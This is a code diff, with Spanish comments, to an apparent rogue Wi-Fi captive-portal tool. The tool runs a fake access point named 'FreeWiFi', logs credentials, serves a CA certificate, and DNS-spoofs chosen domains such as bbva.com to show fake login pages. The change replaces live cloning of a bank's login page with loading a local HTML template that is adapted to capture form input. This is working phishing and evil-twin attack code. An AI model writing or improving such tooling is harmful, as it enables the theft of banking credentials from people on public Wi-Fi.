@@ -629,7 +629,7 @@ def _build_flask_app(gateway_ip, template_type, creds_log,
 
     template_type:     "google" | "custom"
     custom_html:       HTML clonado (solo cuando template_type == "custom")
-    dns_spoof_domains: lista de dicts [{"domain": "bbva.com", "clone_url": "...", "html": "..."}]
+    dns_spoof_domains: lista de dicts [{"domain": "bbva.com", "html_file": "/ruta/login.html", "html": "..."}]
                        Si entry["html"] está relleno, Flask sirve esa copia cuando el Host
                        del request coincide con ese dominio.
     ca_cert_path:      Ruta al fichero CA .crt para servir en /ca.crt
@@ -798,9 +798,9 @@ class CaptivePortal:
         self._logged_in_ips  = set()
 
         # DNS Spoofing por dominio específico
-        # Lista de dicts: [{"domain": "bbva.com", "clone_url": "https://bbva.com/login", "html": "..."}]
-        # Si clone_url está vacío, redirige al captive portal normal.
-        # Si html está relleno (clonado al arrancar), Flask sirve esa copia.
+        # Lista de dicts: [{"domain": "bbva.com", "html_file": "/ruta/login.html", "html": "..."}]
+        # Si html_file está vacío, redirige al captive portal normal.
+        # Si html está relleno (cargado al arrancar desde html_file), Flask sirve esa copia.
         self.dns_spoof_domains   = []
         self.dns_spoof_target_ip = GATEWAY_IP
 
@@ -1431,57 +1431,44 @@ class CaptivePortal:
 
     def _clone_spoof_pages(self):
         """
-        Para cada entrada en dns_spoof_domains que tenga clone_url,
-        clona la pagina y guarda el HTML en entry["html"].
-        Cada clonacion corre en su propio hilo con timeout de 90s
-        para evitar que un sitio lento (classlife, etc.) bloquee el arranque.
+        Para cada entrada en dns_spoof_domains que tenga html_file, carga
+        ese HTML propio desde disco (igual que load_custom_html_file, pasado
+        por _adapt_form) y lo guarda en entry["html"]. Sustituye al antiguo
+        clonado por URL -- ya sabiamos que ese pipeline era poco fiable
+        contra webs reales, y leer un fichero local es instantaneo y no
+        depende de la red.
         """
         if not self.dns_spoof_domains:
             return
 
-        CLONE_TIMEOUT = 90  # segundos maximo por dominio
-
-        def _do_clone(entry):
-            clone_url = entry.get("clone_url", "").strip()
-            if not clone_url:
-                return
-            self._log("[DNS Spoof] Clonando " + clone_url + " para dominio " + entry["domain"])
-            try:
-                result_holder = [None]
-
-                def _run():
-                    result_holder[0] = clone_login_page(clone_url, log_fn=self._log)
-
-                t = threading.Thread(target=_run, daemon=True)
-                t.start()
-                t.join(timeout=CLONE_TIMEOUT)
-
-                if t.is_alive():
-                    self._log("[DNS Spoof] Timeout (" + str(CLONE_TIMEOUT) + "s) clonando " +
-                              clone_url + " -- se usara el portal por defecto")
-                    return
-
-                html = result_holder[0]
-                if html:
-                    entry["html"] = html
-                    self._log("[DNS Spoof] Clonado OK (" + str(len(html)) + " bytes) -> " + entry["domain"])
-                else:
-                    self._log("[DNS Spoof] Fallo al clonar " + clone_url + " -- se usara el portal por defecto")
-            except Exception as ex:
-                self._log("[DNS Spoof] Error clonando " + clone_url + ": " + str(ex))
-
-        # Lanzar todos los clones en paralelo y esperar a que terminen todos
-        threads = []
         for entry in self.dns_spoof_domains:
             if not isinstance(entry, dict):
                 continue
-            t = threading.Thread(target=_do_clone, args=(entry,), daemon=True)
-            t.start()
-            threads.append(t)
+            html_file = entry.get("html_file", "").strip()
+            if not html_file:
+                continue
 
-        # Esperar a todos con margen
-        for t in threads:
-            t.join(timeout=CLONE_TIMEOUT + 5)
+            self._log("[DNS Spoof] Cargando " + html_file + " para dominio " + entry["domain"])
+            try:
+                with open(html_file, "r", encoding="utf-8", errors="ignore") as f:
+                    raw_html = f.read()
+            except Exception as ex:
+                self._log("[DNS Spoof] No se pudo leer " + html_file + ": " + str(ex) +
+                          " -- se usara el portal por defecto")
+                continue
+
+            if not raw_html.strip():
+                self._log("[DNS Spoof] Archivo vacio: " + html_file + " -- se usara el portal por defecto")
+                continue
+
+            try:
+                html = _adapt_form(raw_html, self._log)
+            except Exception as ex:
+                self._log("[DNS Spoof] Error adaptando " + html_file + ": " + str(ex))
+                continue
+
+            entry["html"] = html
+            self._log("[DNS Spoof] Plantilla cargada OK (" + str(len(html)) + " bytes) -> " + entry["domain"])
 
     def start(self, ssid="FreeWiFi", channel=6,
               template="google", out_interface="eth0"):
